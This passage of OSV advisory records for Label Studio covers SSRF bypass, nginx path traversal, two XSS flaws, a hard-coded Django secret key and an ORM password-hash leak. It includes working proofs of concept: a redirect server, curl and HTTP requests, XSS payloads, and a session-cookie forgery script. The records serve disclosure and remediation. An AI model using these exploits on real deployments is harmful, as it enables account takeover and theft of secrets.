sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":[],"details":"### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import *\n\nDJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)\nDATABASES = {'default': DATABASES_ALL[DJANGO_DB]}\n\nMIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')\nMIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')\nif INACTIVITY_SESSION_TIMEOUT_ENABLED:\n    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')\n\nADD_DEFAULT_ML_BACKENDS = False\n\nLOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')\n\nDEBUG = get_bool_env('DEBUG', False)\n\nDEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)\n\nSESSION_COOKIE_SECURE = False\n\nSESSION_ENGINE = \"django.contrib.sessions.backends.signed_cookies\"\n\nRQ_QUEUES = {}\n\nSENTRY_DSN = get_env(\n    'SENTRY_DSN',\n    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'\n)\nSENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')\n\nFRONTEND_SENTRY_DSN = get_env(\n    'FRONTEND_SENTRY_DSN',\n    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')\nFRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')\n\nEDITOR_KEYMAP = json.dumps(get_env(\"EDITOR_KEYMAP\"))\n\nfrom label_studio import __version__\nfrom label_studio.core.utils import sentry\nsentry.init_sentry(release_name='label-studio', release_version=__version__)\n\n# we should do it after sentry init\nfrom label_studio.core.utils.common import collect_versions\nversions = collect_versions()\n\n# in Label Studio Community version, feature flags are always ON\nFEATURE_FLAGS_DEFAULT_VALUE = True\n# or if file is not set, default is using offline mode\nFEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)\n\nfrom core.utils.io import find_file\nFEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')\nFEATURE_FLAGS_FROM_FILE = True\ntry:\n    from core.utils.io import find_node\n    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')\nexcept IOError:\n    FEATURE_FLAGS_FROM_FILE = False\n\nSTORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)\n```\n\n\n### Impact\nThe impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)\n","fixed_in":["1.7.2"],"id":"GHSA-cpmr-mw4j-99r7","link":"https://osv.dev/vulnerability/GHSA-cpmr-mw4j-99r7","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash 